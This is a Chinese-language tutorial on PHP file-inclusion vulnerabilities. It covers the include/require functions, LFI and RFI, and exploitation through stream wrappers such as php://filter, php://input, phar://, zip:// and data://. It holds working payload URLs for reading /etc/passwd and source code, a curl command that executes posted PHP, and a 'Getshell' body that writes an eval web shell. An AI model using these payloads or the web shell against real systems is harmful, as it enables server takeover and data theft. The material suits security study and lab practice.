作者：Qftm 合天智汇

## 前言  

这个手册主要是记录针对PHP文件包含漏洞的利用思路与Bypass手法的总结。

## 相关函数  

## 四个函数  

php中引发文件包含漏洞的通常主要是以下四个函数：

1、include()

    
    
    http://www.php.net/manual/en/function.include.php

2、include_once()

    
    
    http://php.net/manual/en/function.include-once.php

3、require()

    
    
    http://php.net/manual/en/function.require.php

4、require_once()

    
    
    http://php.net/manual/en/function.require-once.php

## 函数功能  

当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。

![v2-7ac4268d129cdcfb25f2fbcc849fe6c1_720w](https://pic4.zhimg.com/80/v2-7ac4268d129cdcfb25f2fbcc849fe6c1_720w.png)

## 函数差异  

include()

include() 函数包含出错的话，只会提出警告，不会影响后续语句的执行

![image.png](https://image.3001.net/images/20200426/1587885013_5ea533d50703d.png!small)  

require()

require() 函数包含出错的话，则会直接退出，后续语句不在执行

![image.png](https://image.3001.net/images/20200426/1587885028_5ea533e4cb14b.png!small)  

include_once() 和 require_once()

require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则
require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。

二次包含

![image.png](https://image.3001.net/images/20200426/1587885039_5ea533ef9f068.png!small)  

一次包含

![v2-ce99d62cb50c6aa3ebf7c334374a4a5a_720w](https://pic4.zhimg.com/80/v2-ce99d62cb50c6aa3ebf7c334374a4a5a_720w.png)

## 漏洞原因  

文件包含函数所加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致执行了非预期的代码。

## 漏洞分类  

## LFI  

LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。同时借助此漏洞也可以查看服务器上的一些重要文件。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。

例如本地读取/etc/passwd系统重要文件

![v2-e03158310adb631fb07fd8466f908d5e_720w](https://pic4.zhimg.com/80/v2-e03158310adb631fb07fd8466f908d5e_720w.png)

## RFI  

RFI(Remote File Inclusion)
远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。
但RFI的利用条件较为苛刻，需要php.ini中进行配置

    
    
    allow_url_fopen = On
    allow_url_include = On

`allow_url_fopen = On`

该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。

allow_url_include：On

该选项为on便是允许 包含URL 对象文件等。

两个配置选项均需要为On，才能远程包含文件成功

修改php.ini

![image.png](https://image.3001.net/images/20200426/1587885071_5ea5340f14c7b.png!small)  

在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。

php5.5.9 -> php.ini

![image.png](https://image.3001.net/images/20200426/1587885083_5ea5341b18fbc.png!small)  

## 包含姿势  

## php伪协议  

PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize()
的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。

    
    
    file:// — 访问本地文件系统
    http:// — 访问 HTTP(s) 网址
    ftp:// — 访问 FTP(s) URLs
    php:// — 访问各个输入/输出流（I/O streams）
    zlib:// — 压缩流
    data:// — 数据（RFC 2397）
    glob:// — 查找匹配的文件路径模式
    phar:// — PHP 归档
    ssh2:// — Secure Shell 2
    rar:// — RAR
    ogg:// — 音频流
    expect:// — 处理交互式的流

可以在phpinfo中的Registered PHP Streams中找到可使用的协议。

下面测试代码均为：

    
    
    <?php
        $file  = $_GET['file'];
        include($file);
    ?>

若有特殊案例，会声明。

php.ini

    
    
    allow_url_fopen 默认为 On
    allow_url_include 默认为 Off

若有特殊要求，会在利用条件里指出。

### php://filter  

php://filter 是一种元封装器，
设计用于数据流打开时的[筛选过滤](https://www.php.net/manual/zh/filters.php)应用。

参数

![v2-8ca67f9eb4cd4befadecc194818c6d1c_720w](https://pic4.zhimg.com/80/v2-8ca67f9eb4cd4befadecc194818c6d1c_720w.png)

过滤器列表

  * [字符串过滤器](https://www.php.net/manual/zh/filters.string.php)  

  * [string.strip_tags](https://www.php.net/manual/zh/filters.string.strip_tags.php)  

  * [转换过滤器](https://www.php.net/manual/zh/filters.convert.php)  

  * [压缩过滤器](https://www.php.net/manual/zh/filters.compression.php)  

  * [加密过滤器](https://www.php.net/manual/zh/filters.encryption.php)  

    
    
    可用过滤器列表：https://www.php.net/manual/zh/filters.php

利用条件：无

利用姿势1：

    
    
    index.php?file=php://filter/read=convert.base64-encode/resource=index.php

通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。同时也能够对网站源码进行审计。

![v2-df2854a85a38eb68bdc81990e94ef771_720w](https://pic2.zhimg.com/80/v2-df2854a85a38eb68bdc81990e94ef771_720w.png)

利用姿势2：

    
    
    index.php?file=php://filter/convert.base64-encode/resource=index.php

效果跟前面一样，只是少了个read关键字，在绕过一些waf时也许有用。

### file://  

专们用于访问本地文件系统和php://filter类似都可以对本地文件进行读取

用法：

    
    
    /path/to/file.ext
    relative/path/to/file.ext
    fileInCwd.ext
    C:/path/to/winfile.ext
    C:\path\to\winfile.ext
    \\smbserver\share\path\to\winfile.ext
    file:///path/to/file.ext
    
    ?file=file://[文件的绝对路径+文件名]

利用条件：无

利用姿势：

    
    
    index.php?file=file:///etc/passwd

![v2-7790c481f38e4798e8cd92f555ee8c49_720w](https://pic2.zhimg.com/80/v2-7790c481f38e4798e8cd92f555ee8c49_720w.png)

### php://input  

php://input是个可以访问请求的原始数据的只读流，将post请求中的数据作为PHP代码执行。

利用条件：

    
    
    allow_url_include = On
    allow_url_fopen = On/Off

利用姿势：

    
    
    index.php?file=php://input
    
    POST:
    <?php phpinfo();?>/<? phpinfo();?>

![v2-2225ee226b39abe2fc9ec787a1623fdb_720w](https://pic1.zhimg.com/80/v2-2225ee226b39abe2fc9ec787a1623fdb_720w.png)

也可以使用burpsuite或curl进行利用

    
    
    curl -v "http://127.0.0.1/FI/index.php?file=php://input" -d "<?php phpinfo();?>"
    Getshell
    POST:
    
    <?PHP fputs(fopen('shell.php','w'),'<?php @eval($_POST[Qftm])?>');?>

file_get_contents()的利用

file_get_contents()函数将整个文件读入一个字符串中

测试代码

    
    
    <?php$file  = $_GET['file'];
    if(file_get_contents($file,'r') == "Qftm"){
        echo "you are Admin!!!";
    }
    ?>

利用条件：无

利用姿势：

    
    
    file_get.php?file=php://input
    
    POST:
    Qftm

php://input可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。

![v2-177b290c3621c92cf34881350976bf54_720w](https://pic1.zhimg.com/80/v2-177b290c3621c92cf34881350976bf54_720w.png)

### phar://  

phar:// 支持zip、phar格式的文件包含。

  * zip  

用法：

    
    
    ?file=phar://[压缩包文件相对路径]/[压缩文件内的子文件名]
    ?file=phar://[压缩包文件绝对路径]/[压缩文件内的子文件名]

利用条件：php >= 5.3.0

利用姿势1：

配合文件上传漏洞，当仅可以上传zip格式时

    
    
    index.php?file=phar://index.zip/index.txt
    
    
    index.php?file=phar://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/index.zip/index.txt

新建index.txt，使用zip格式压缩 -> index.zip

![v2-b3c216bfc006a81f267f9296e4812ab5_720w](https://pic4.zhimg.com/80/v2-b3c216bfc006a81f267f9296e4812ab5_720w.png)

利用姿势2：

配合文件上传漏洞，当仅可以上传图片格式时

针对phar://不管后缀是什么，都会当做压缩包来解压。

    
    
    index.php?file=phar://head.png/head.txt
    
    
    index.php?file=phar://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/head.png/head.txt

将做好的zip后缀改为png格式

![image.png](https://image.3001.net/images/20200426/1587885255_5ea534c761a17.png!small)  

  * phar  

phar文件本质上是也一种压缩文件。

用法：

    
    
    ?file=phar://[压缩包文件相对路径]/[压缩文件内的子文件名]
    ?file=phar://[压缩包文件绝对路径]/[压缩文件内的子文件名]

制作phar文件：

制作包含恶意代码文件的phar文件

（1）确保本地php.ini中phar.readonly=Off

![v2-846b8b5f8334709134c20f235d1aeb41_720w](https://pic4.zhimg.com/80/v2-846b8b5f8334709134c20f235d1aeb41_720w.png)

（2）编写恶意phar文件的php脚本

phar.php

    
    
    <?php
        @unlink("phar.phar");
        $phar = new Phar("phar.phar");
        $phar->startBuffering();
        $phar->setStub("<?php __HALT_COMPILER(); ?>");  //设置stub
        $phar->addFromString("head.txt", "<?php phpinfo();?>");  //添加要压缩的文件及内容
        //签名自动计算 
        $phar->stopBuffering();
    ?>

（3）生成phar文件

    
    
    <?php 
    $p = new PharData(dirname(FILE).'/phartest.aaa', 0,'phartest',Phar::ZIP) ; 
    $p->addFromString('testfile.txt', '<?php phpinfo();?>');  
    ?>

![image.png](https://image.3001.net/images/20200426/1587885294_5ea534eea1aa0.png!small)  

 **利用条件** ：php >= 5.3.0利用姿势1：

    
    
    index.php?file=phar://phar.phar/head.txt
    
    index.php?file=phar://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/phar.phar/head.txt

![image.png](https://image.3001.net/images/20200426/1587885312_5ea5350024d40.png!small)  

 **利用姿势2：**

    
    
    index.php?file=phar://phar.png/head.txt
    
    index.php?file=phar://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/phar.png/head.txt

利用协议特性，更改后缀文件可适当绕过一些限制

![v2-82a384239f9ca90357ffb35dfe84dcac_720w](https://pic2.zhimg.com/80/v2-82a384239f9ca90357ffb35dfe84dcac_720w.png)

 **zip://`**

zip协议`和`phar协议`类似，都支持`相对路径`和`绝对路径`（几乎网上所有人都说`zip协议`不支持`相对路径`，事实上是可以！！！）在`php
version 5.2.9`时已经修复`zip://`相对路径问题

![image.png](https://image.3001.net/images/20200426/1587885336_5ea5351857ae0.png!small)  

使用zip协议，需将`#`编码为`%23`(浏览器时)

 **用法：**

    
    
    ?file=zip://[压缩包文件相对路径]#[压缩文件内的子文件名]
    ?file=zip://[压缩包文件绝对路径]#[压缩文件内的子文件名]

 **利用条件** ：php >= 5.2（绝对路径） | php >= 5.29（相对/绝对路径）

 **利用姿势1：**

    
    
    index.php?file=zip://head.zip%23head.txt
    
    
    index.php?file=zip://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/head.zip%23head.txt

![v2-b0fdcfbce77e37e64549172e99c16937_720w](https://pic2.zhimg.com/80/v2-b0fdcfbce77e37e64549172e99c16937_720w.png)

 **利用姿势2** ：

针对`zip://`不管后缀是什么，都会当做压缩包来解压，可以适当的绕过一些限制。

    
    
    index.php?file=zip://head.png%23head.txt
    
    
    index.php?file=zip://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/head.png%23head.txt

相对路径`php5.3.29 windows`

![v2-9027868927cf91ef6862c648b043d9f2_720w](https://pic1.zhimg.com/80/v2-9027868927cf91ef6862c648b043d9f2_720w.png)

`php5.5.9 windows`

![image.png](https://image.3001.net/images/20200426/1587885412_5ea5356489772.png!small)  

`5.4.16 Linux Centos7`

![v2-1960587e79889a3c6da0f52b82fa7ef4_720w](https://pic2.zhimg.com/80/v2-1960587e79889a3c6da0f52b82fa7ef4_720w.png)

绝对路径`

windwos`

![v2-a1b47355a111c3b8efe4316917e8245d_720w](https://pic1.zhimg.com/80/v2-a1b47355a111c3b8efe4316917e8245d_720w.png)

`Linux Centos7`

![v2-3eecdcbfbfac4aae01927fa27e1ca087_720w](https://pic1.zhimg.com/80/v2-3eecdcbfbfac4aae01927fa27e1ca087_720w.png)

 **bzip2://**

 **用法：**

    
    
    ?file=compress.bzip2://[压缩包文件相对路径] 
    ?file=compress.bzip2://[压缩包文件绝对路径]

 **利用条件：php >= 5.2**

 **利用姿势1：**

    
    
    index.php?file=compress.bzip2://head.bz2
    
    
    index.php?file=compress.bzip2://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/head.bz2

相对路径

![image.png](https://image.3001.net/images/20200426/1587885469_5ea5359d70e2d.png!small)  

绝对路径

![v2-2c6c51fd5716bdb0c436746846d5ec8a_720w](https://pic1.zhimg.com/80/v2-2c6c51fd5716bdb0c436746846d5ec8a_720w.png)

 **利用姿势2** ：

利用协议特性，更改后缀文件可适当绕过一些限制

    
    
    index.php?file=compress.bzip2://head.jpg
    
    
    index.php?file=compress.bzip2://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/head.jpg

![image.png](https://image.3001.net/images/20200426/1587885493_5ea535b523d9c.png!small)  

 **zlib://**

 **用法：**

    
    
    ?file=compress.zlib://[压缩包文件相对路径] 
    ?file=compress.zlib://[压缩包文件绝对路径]

 **利用条件** ：php >= 5.2

 **利用姿势1** ：

    
    
    index.php?file=compress.zlib://head.gz
    
    
    index.php?file=compress.zlib://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/head.gz

相对路径

![v2-53ce451f05a3566b82ab97c0a3cdef3a_720w](https://pic4.zhimg.com/80/v2-53ce451f05a3566b82ab97c0a3cdef3a_720w.png)

绝对路径

![v2-ada66bb8aa7be50bc24b4d35fd65665d_720w](https://pic2.zhimg.com/80/v2-ada66bb8aa7be50bc24b4d35fd65665d_720w.png)

 **利用姿势2：**

利用协议特性，更改后缀文件可适当绕过一些限制

    
    
    index.php?file=compress.zlib://head.jpg
    
    
    index.php?file=compress.zlib://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/head.jpg

![v2-c0a86a18a24ec0fee540e72853fccbfd_720w](https://pic4.zhimg.com/80/v2-c0a86a18a24ec0fee540e72853fccbfd_720w.png)

 **data://**

数据流封装器，和php://相似都是利用了流的概念用法：

    
    
    data:,<文本数据> 
    data:text/plain,<文本数据> 
    data:text/html, <HTML代码>
    data:text/html;base64,<base64编码的HTML代码>
    data:text/css, <CSS代码>
    data:text/css;base64, <base64编码的CSS代码>
    data:text/javascript,<Javascript代码>
    data:text/javascript;base64,<base64编码的Javascript代码>
    data:image/gif;base64,base64编码的gif图片数据 
    data:image/png;base64,base64编码的png图片数据 
    data:image/jpeg;base64,base64编码的jpeg图片数据 
    data:image/x-icon;base64,base64编码的icon图片数据

 **利用条件：**

    
    
    php >= 5.2 
    allow_url_fopen = On
    
    allow_url_include = On

利用姿势1：

    
    
    index.php?file=data:text/plain,<?php phpinfo();?>
    
    
    index.php?file=data://text/plain,<?php phpinfo();?> ```

......未完待续

实验推荐：文件包含漏洞-中级篇

<http://hetianlab.com/expc.do?ce=364ed95b-3c22-4556-b658-85d4768a0a48>

（介绍文件包含时绕过限制的原理，以及介绍利用文件包含漏洞读取源码的原理。）

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

